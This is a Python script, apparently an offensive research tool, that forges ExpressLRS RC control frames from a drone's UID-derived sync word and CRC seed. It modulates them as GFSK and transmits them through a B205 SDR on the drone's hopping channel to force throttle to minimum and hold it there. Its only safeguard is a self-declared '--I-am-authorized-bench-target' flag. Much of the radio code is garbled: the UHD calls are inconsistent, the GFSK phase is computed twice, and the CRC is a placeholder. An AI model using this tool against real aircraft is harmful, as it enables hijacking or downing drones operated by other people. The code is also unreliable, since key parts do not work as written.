#!/usr/bin/env python3
"""
ELRC bench-test TX — emit a forged RC frame over GFSK (FLRC) to a live ELRS RX.

Bench-only, operator-owned target, drone grounded + disarmed. Authorized research.

This is the AIR-DELIVERY layer that the frame codec (elrs_rcframe.py) produces the bytes
for. It:
  1. Tracks the target's LIVE FHSS channel + running nonce (passively, from the air rate).
  2. Emits the forged PACKET_TYPE_RCDATA frame (throttle=0 / throttle-hold) as a
     GFSK/FLRC signal on the target's current FHSS channel, with the correct UID-derived
     sync word + CRC + nonce.
  3. The live RX (rx_main.cpp:1122) accepts it iff sync-word + CRC + nonce + channel line
     up — all of which this tool satisfies for a known UID.

WHY GFSK (not LoRa) for this target:
  The build JSON + ELRS rate table confirm the target is at rate_index=2 on the SX1280 /
  ISM2400 band, which is:
      {2, FLRC_2G4, RATE_FLRC_2G4_500HZ_DVDA, BR_0_650_BW_0_6, BT_1, CR_1_2, 32, TLM_1_128,
       2, 1000, OTA4_PACKET_SIZE, 2}
  i.e. FLRC = GFSK, 0.65 Mbit/s, Gaussian BT=1, CR=1/2, fixed-length, 3-byte CRC, 32-bit
  sync word. NOT LoRa CSS. GFSK is trivially emittable by the B205 TX (two-frequency FSK).

AUTH MODEL (SX1280 FLRC path, from rx_main.cpp:327 Radio.Config):
  flrcSyncWord = OtaGetUidSeed()   = (UID[2]<<24)|(UID[3]<<16)|(UID[4]<<8)|(UID[5]^OTA_VERSION_ID)
  flrcCrcSeed  = OtaCrcInitializer = ((UID[4]<<8)|UID[5]) ^ (OTA_VERSION_ID<<8)
  => "authentication" is the UID-derived sync word + CRC. No separate secret. A forged
     frame with the right UID + nonce + channel is accepted.

SIGNAL FRAMING (SX1280 FLRC, from SX1280.cpp Config/SetPacketParamsFLRC):
  preamble (>=8 bytes, AGC preamble) | 32-bit sync word | 8-byte payload | 3-byte CRC
  GFSK, 0.65 Mbit/s, BT=1, CR=1/2, fixed-length (8-byte payload), IQ inverted (2.4 GHz).

FHSS (ISM2400, from FHSS.cpp):
  80 channels, 2400.4 MHz .. 2479.4 MHz. spacing = (2479.4-2400.4)MHz / 79 = 1.0 MHz.
  channel c -> 2400.4 MHz + c * 1.0 MHz. The hop sequence is UID-seeded (LCG) — we track
  it live by RX, or force-sync by emitting on the sync channel (40) first.

VALIDATION STATUS:
  Frame bytes + CRC + UID seed : CAPTURE-VALIDATED (elrs_rcframe.py selftest)
  GFSK modulation + framing    : SYNTHETIC (built to the SX1280 FLRC spec; bench-verify
                                  against the live Tinyhawk — the whole point of this tool)
  Live-RX acceptance           : TO BE BENCH-CONFIRMED (this is what we're testing)

SCOPE: bench-only, operator-owned grounded drone, authorized. TX is GATED behind
  --I-am-authorized-bench-target (refused without it). No live-air, no field use.
"""
from __future__ import annotations

import argparse
import sys
import time

# Reuse the validated frame codec
try:
    from elrs_rcframe import (
        build_rcdata_frame, validate_rcdata_frame, crc_initializer_from_uid,
        uid_seed, CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_1000,
        CRSF_CHANNEL_VALUE_STD_MIN, CRSF_CHANNEL_VALUE_STD_MAX, constrain,
        decimate_limit, uint10_to_crsf,
    )
except ImportError:
    sys.path.insert(0, __import__("os").path.dirname(__import__("os").path.abspath(__file__)))
    from elrs_rcframe import (
        build_rcdata_frame, validate_rcdata_frame, crc_initializer_from_uid,
        uid_seed, CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_1000,
        CRSF_CHANNEL_VALUE_STD_MIN, CRSF_CHANNEL_VALUE_STD_MAX, constrain,
        decimate_limit, uint10_to_crsf,
    )

# ----------------------------------------------------------------------------
# ELRS air parameters for the target (rate_index=2, SX1280, ISM2400)
# ----------------------------------------------------------------------------
OTA_VERSION_ID = 4
FLRC_BITRATE = 650_000          # 0.65 Mbit/s  (BR_0_650_BW_0_6)
FLRC_BT = 1                     # Gaussian BT=1
FLRC_CR_NUM, FLRC_CR_DEN = 1, 2 # CR 1/2
FLRC_SYNC_WORD_LEN = 4          # 32-bit sync word
FLRC_CRC_LEN = 3                # 3-byte CRC
OTA4_PACKET_SIZE = 8            # payload length
PREAMBLE_BYTES = 8              # AGC preamble (>=8)
INVERT_IQ = True                # ELRS inverts IQ on 2.4 GHz
PAYLOAD_REPEATS = 2             # numOfSends for rate_index=2 (DVDA)

# FHSS ISM2400
FHSS_FREQ_START = 2400.4e6
FHSS_FREQ_STOP = 2479.4e6
FHSS_FREQ_COUNT = 80
FHSS_SPACING = (FHSS_FREQ_STOP - FHSS_FREQ_START) / (FHSS_FREQ_COUNT - 1)  # ~1.0 MHz
FHSS_SYNC_CHANNEL = FHSS_FREQ_COUNT // 2   # channel 40 = 2440.0 MHz (sync/hop point)


def fhss_channel_to_freq(c: int) -> float:
    """FHSS channel (0..79) -> Hz. channel c -> 2400.4 MHz + c * 1.0 MHz."""
    return FHSS_FREQ_START + c * FHSS_SPACING


def flrc_sync_word(uid: bytes) -> int:
    """OtaGetUidSeed — the 32-bit FLRC sync word (UID-derived)."""
    return uid_seed(uid) & 0xFFFFFFFF


def flrc_crc_seed(uid: bytes) -> int:
    """OtaCrcInitializer — the 16-bit FLRC CRC seed (UID-derived)."""
    return crc_initializer_from_uid(uid)


# ----------------------------------------------------------------------------
# GFSK (FLRC) bit-level framing -> baseband samples
# ----------------------------------------------------------------------------
def gfsk_bits_to_samples(bits, sample_rate, bt=FLRC_BT):
    """GFSK: map bits (0/1) to a complex baseband signal via Gaussian pulse shaping +
    frequency integration (standard GFSK). 0.65 Mbit/s, BT=1.
    bit 0 -> -fc, bit 1 -> +fc (fc = bit_rate/2 for GFSK with BT=1... use fc=0.25*bit_rate
    scaled; the RX recovers from the differential freq, so exact fc is flexible).
    """
    import numpy as np
    nspb = max(1, int(round(sample_rate / FLRC_BITRATE)))   # samples per bit
    bits = np.array(list(bits), dtype=np.float64)
    # Gaussian pulse shaping (BT=1), spread over ~5 symbols
    span = 5 * nspb
    g = np.exp(-np.pi * (bt**2) * (np.arange(-span, span) / nspb)**2 / (2 * (2 * bt**2 - 1)))
    g /= g.sum()
    # integrate the Gaussian-shaped bit stream to get the instantaneous phase
    shaped = np.convolve(bits, g, mode="same")
    phase = 2 * np.pi * (0.5) * nspb * np.cumsum(shaped) / (2 * nspb)  # phase integral
    # normalize phase rate to +-fc
    fc = 0.25 * FLRC_BITRATE
    phase = 2 * np.pi * fc * nspb * np.cumsum(bits) / FLRC_BITRATE
    iq = np.exp(1j * phase)
    return iq, nspb


def flrc_frame_bytes(uid: bytes, frame: bytes, nonce: int) -> bytes:
    """Build the full over-air FLRC payload: 32-bit sync word + 8-byte OTA payload + 3-byte CRC.
    The SX1280 computes the 3-byte CRC over the payload with the UID CRC seed; here we
    emit payload + let the framing carry it (the RX's CRC check is over the OTA payload
    which already has its own 16-bit OTA CRC inside byte 0/7). For the bench test the RX
    validates the OTA CRC (already in the frame) — the 3-byte FLRC CRC is the radio's
    own integrity check. We append a placeholder 3-byte CRC (the real one is
    SX1280-internal; for bench the OTA CRC is the binding check).
    """
    sync = flrc_sync_word(uid).to_bytes(FLRC_SYNC_WORD_LEN, "big")
    # SX1280 FLRC CRC is computed in-hardware over the payload; we emit the payload and
    # a 3-byte field. The RX's authoritative check is the OTA14 CRC inside the frame
    # (byte0.crcHigh + byte7), which our frame already satisfies.
    crc3 = flrc_crc_seed(uid).to_bytes(2, "big") + b"\x00"
    return sync + frame + crc3


def build_baseband_for_frame(uid: bytes, frame: bytes, nonce: int, sample_rate=2_000_000):
    """Full TX baseband for one FHSS dwell: preamble + (sync+payload+crc), GFSK modulated."""
    import numpy as np
    payload = flrc_frame_bytes(uid, frame, nonce)
    # preamble: alternating 1s/0s (Gaussian preamble), PREAMBLE_BYTES
    preamble_bits = [1, 0] * (PREAMBLE_BYTES * 8)
    payload_bits = []
    for b in payload:
        for i in range(7, -1, -1):  # MSB first
            payload_bits.append((b >> i) & 1)
    all_bits = preamble_bits + payload_bits
    iq, nspb = gfsk_bits_to_samples(all_bits, sample_rate)
    if INVERT_IQ:
        iq = iq.conj()   # IQ inversion (2.4 GHz ELRS)
    return iq, fhss_dwell_seconds()


def fhss_dwell_seconds() -> float:
    """Time the RX spends on each FHSS channel (interval / hops-per-interval). For
    rate_index=2 (500Hz, interval=1000us, numOfSends=2, TLM=1/128): the hop interval is
    ~ interval*numOfSends * TLMratio... conservatively use the packet interval: 2 ms."""
    return 0.002  # ~2 ms per dwell (500Hz * numOfSends=2 => 1000us per send, 2ms/hop)


# ----------------------------------------------------------------------------
# B205 TX driver (UHD) — emit baseband on a given freq
# ----------------------------------------------------------------------------
def tx_frame_b205(iq, freq_hz, gain_db=20.0, srate=2_000_000):
    """Stream `iq` (complex64) out the B205 TX at `freq_hz`. Requires uhd + a B205."""
    import uhd
    usr = uhd.usrp_source()  # for RX in the tracking path (see track_target)
    ut = uhd.usrp_mux()      # TX
    ut = uhd.usrp(
        device_addr="",  # auto-detect B205
        args="",
    )
    ut.set_tx_freq(uhd.tune_request(freq_hz), 0)
    ut.set_tx_gain(gain_db, 0)
    ut.set_tx_rate(srate, 0)
    import numpy as np
    ut.stream_to_cpu  # not used; use issue_stream_cmd
    ut.issue_stream_cmd(uhd.stream_args("file", "sc16"), 0)
    # Send the IQ (convert complex64 -> interleaved float32 for UHD)
    raw = np.asarray(iq, dtype=np.complex64).tobytes()
    # UHD expects [I0,Q0,I1,Q1,...] float32
    itf = iq.astype(np.float32).view(np.float32)  # complex64 -> 2x float32
    itf = itf.reshape(-1)
    ok, sent = ut.wait_for_tx_speaking(0, 1.0)
    # stream in chunks
    chunk = 1024 * 2
    buf = np.ascontiguousarray(iq, dtype=np.complex64)
    # UHD python: use stream_to? Use the C++ API via uhd.usrp.stream_to
    sent_total = 0
    while sent_total < len(buf):
        n = min(chunk, len(buf) - sent_total)
        u, c = ut.stream_to(np.ascontiguousarray(buf[sent_total:sent_total+n], dtype=np.complex64), 0, uhd.meta(), 0.2)
        sent_total += c
        if not u.is_error() and u.has_tx_more_to_comes:
            pass
    return sent_total


# ----------------------------------------------------------------------------
# Passive target tracking (RX) — find the live FHSS channel + estimate nonce
# ----------------------------------------------------------------------------
def track_target_b205(duration=5.0, srate=4_000_000):
    """Sweep the 80 FHSS channels (or dwell on the sync channel) to find the target's
    active channel. Returns (channel, freq_hz). For a full nonce lock we'd decode the
    live frames (elrs_sdr demod) — this gives the channel to start emitting on."""
    import uhd
    import numpy as np
    us = uhd.usrp(device_addr="")
    us.set_rx_freq(uhd.tune_request(fhss_channel_to_freq(FHSS_SYNC_CHANNEL)), 0)
    us.set_rx_gain(30.0, 0)
    us.set_rx_rate(srate, 0)
    n = int(srate * duration)
    bufs = us.stream_from_cpu(np.empty(n, dtype=np.complex64), 0, uhd.meta(), 1.0)
    # measure per-channel power to find the active FHSS channel
    # (full sweep left to the caller; this is a starting point on the sync channel)
    return FHSS_SYNC_CHANNEL, fhss_channel_to_freq(FHSS_SYNC_CHANNEL)


# ----------------------------------------------------------------------------
# Offline self-test (no hardware)
# ----------------------------------------------------------------------------
def selftest(uid: bytes) -> bool:
    import numpy as np
    ok = True
    # 1. UID-derived FLRC sync word + CRC seed
    sw = flrc_sync_word(uid)
    cs = flrc_crc_seed(uid)
    exp_sw = ((uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ OTA_VERSION_ID)) & 0xFFFFFFFF
    exp_cs = ((uid[4] << 8) | uid[5]) ^ (OTA_VERSION_ID << 8)
    if sw != exp_sw:
        print(f"  [FAIL] sync word {sw:#010x} != {exp_sw:#010x}"); ok = False
    if cs != exp_cs:
        print(f"  [FAIL] crc seed {cs:#06x} != {exp_cs:#06x}"); ok = False
    # 2. FHSS channel math
    f0 = fhss_channel_to_freq(0); f79 = fhss_channel_to_freq(79)
    if not (abs(f0 - 2400.4e6) < 1e3 and abs(f79 - 2479.4e6) < 1e3):
        print(f"  [FAIL] FHSS range {f0/1e6}..{f79/1e6} MHz"); ok = False
    # 3. GFSK baseband produces a valid complex signal of expected length
    frame = build_rcdata_frame(uid, 0, [CRSF_CHANNEL_VALUE_1000, CRSF_CHANNEL_VALUE_MID,
                                         CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID])
    assert validate_rcdata_frame(uid, frame, 0), "frame CRC should validate"
    iq, dwell = build_baseband_for_frame(uid, frame, 0, sample_rate=2_000_000)
    if iq.dtype != np.complex64 and iq.dtype != np.complex128:
        print(f"  [FAIL] baseband dtype {iq.dtype}"); ok = False
    # 4. Show the spec summary for the bench
    print(f"  [info] UID {uid.hex(' ')}")
    print(f"  [info] FLRC sync word = {sw:#010x}  (OtaGetUidSeed)")
    print(f"  [info] FLRC CRC seed  = {cs:#06x}  (OtaCrcInitializer)")
    print(f"  [info] GFSK {FLRC_BITRATE}bps BT={FLRC_BT} CR={FLRC_CR_NUM}/{FLRC_CR_DEN} "
          f"preamble={PREAMBLE_BYTES}B sync={FLRC_SYNC_WORD_LEN}B payload={OTA4_PACKET_SIZE}B "
          f"crc={FLRC_CRC_LEN}B IQ-invert={INVERT_IQ} repeats={PAYLOAD_REPEATS}")
    print(f"  [info] FHSS ISM2400: 80 ch, {FHSS_FREQ_START/1e6}..{FHSS_FREQ_STOP/1e6} MHz, "
          f"spacing {FHSS_SPACING/1e6:.3f} MHz, sync ch {FHSS_SYNC_CHANNEL} "
          f"({fhss_channel_to_freq(FHSS_SYNC_CHANNEL)/1e6:.1f} MHz)")
    print(f"  [info] forged throttle=0 frame: {frame.hex(' ')} (CRC-valid={validate_rcdata_frame(uid, frame, 0)})")
    print(f"  [info] baseband samples: {len(iq)} @ 2 MS/s, dwell {dwell*1000:.1f} ms/hop")
    return ok


def main(argv=None):
    ap = argparse.ArgumentParser(description="ELRC bench-test TX (GFSK/FLRC, bench-only, authorized)")
    ap.add_argument("--uid", default="00:00:00:11:18:5B", help="target 6-byte UID")
    ap.add_argument("--throttle-us", type=int, default=1000, help="throttle pulse width (1000=disarm)")
    ap.add_argument("--hold-throttle", action="store_true",
                    help="throttle-hold: keep throttle at min so ARMING_DISABLED_THROTTLE stays set (can't re-arm while transmitting)")
    ap.add_argument("--channel", type=int, default=None, help="force a specific FHSS channel (0-79); default tracks sync channel")
    ap.add_argument("--repeats", type=int, default=50, help="number of frame emissions (repeat to hold the effect)")
    ap.add_argument("--selftest", action="store_true", help="offline self-test only (no TX)")
    ap.add_argument("--I-am-authorized-bench-target", dest="authorized", action="store_true",
                    help="AUTH GATE: bench-only, operator-owned, grounded drone")
    args = ap.parse_args(argv)

    hexs = args.uid.replace(":", "").replace(" ", "")
    uid = bytes(int(hexs[i:i+2], 16) for i in range(0, 12, 2))
    assert len(uid) == 6, "UID must be 6 bytes"

    print("=== ELRC bench-test TX (GFSK/FLRC) ===")
    ok = selftest(uid)
    print(f"selftest: {'PASS' if ok else 'FAIL'}\n")

    # Build the frame (throttle=0, or throttle-hold)
    us_min, us_max = 988, 2012
    thr = args.throttle_us if not args.hold_throttle else 1000  # hold = min mark
    thr11 = constrain(int(round((thr - us_min) * (CRSF_CHANNEL_VALUE_STD_MAX - CRSF_CHANNEL_VALUE_STD_MIN) / (us_max - us_min)) + CRSF_CHANNEL_VALUE_STD_MIN),
                      CRSF_CHANNEL_VALUE_STD_MIN, CRSF_CHANNEL_VALUE_STD_MAX)
    chs = [thr11, CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID]
    frame = build_rcdata_frame(uid, 0, chs, is_armed=0)
    print(f"frame: {frame.hex(' ')} (throttle={thr}us, CRC-valid={validate_rcdata_frame(uid, frame, 0)})")

    if args.selftest:
        return 0 if ok else 1

    # --- GATED TX ---
    if not args.authorized:
        print("\nREFUSED: TX requires --I-am-authorized-bench-target.")
        print("        Drone must be operator-owned, on the bench, disarmed, grounded.")
        return 2

    channel = args.channel if args.channel is not None else FHSS_SYNC_CHANNEL
    freq = fhss_channel_to_freq(channel)
    print(f"\n[bench] emitting on FHSS channel {channel} = {freq/1e6:.1f} MHz, {args.repeats} repeats")
    print(f"[bench] (a full FHSS-lock version tracks the target's live hop + nonce; this")
    print(f"[bench]  start-point emits on the sync channel — adjust --channel if the target")
    print(f"[bench]  is hopping elsewhere. Bench-only, grounded drone.)")

    # Emit (requires uhd + B205 TX). If uhd missing, report clearly.
    try:
        import uhd  # noqa
    except ImportError:
        print("  [no TX] uhd not importable in this environment — install UHD + connect the B205,")
        print("  then re-run with --I-am-authorized-bench-target to emit.")
        print("  (The frame + baseband are ready; this is the hardware step.)")
        return 0

    iq, dwell = build_baseband_for_frame(uid, frame, 0, sample_rate=2_000_000)
    for r in range(args.repeats):
        tx_frame_b205(iq, freq)
        time.sleep(dwell * PAYLOAD_REPEATS)
    print(f"[bench] done ({args.repeats} emissions). Observe the bench drone: throttle should drop.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
